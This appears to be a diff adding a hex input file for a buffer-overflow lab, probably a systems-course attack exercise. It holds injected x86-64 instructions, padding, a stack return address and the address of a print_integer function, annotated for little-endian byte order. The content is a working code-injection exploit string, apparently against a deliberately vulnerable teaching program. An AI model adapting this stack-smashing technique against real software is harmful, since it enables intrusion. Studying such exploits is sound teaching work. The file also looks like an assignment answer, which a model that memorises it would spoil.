@@ -1,0 +1,16 @@
+/* mov $0x14,%rdi */
+48 c7 c7 14 00 00 00
+/* add $0x35,%rdi */
+                     48
+83 c7 35
+/* ret */
+         c3
+/* padding */
+            00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* exploit code's address */
+90 90 3c 61 fd 7f 00 00   /* don't forget byte-reversal for little-endian */
+/* print_integer's address */
+c7 06 40 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
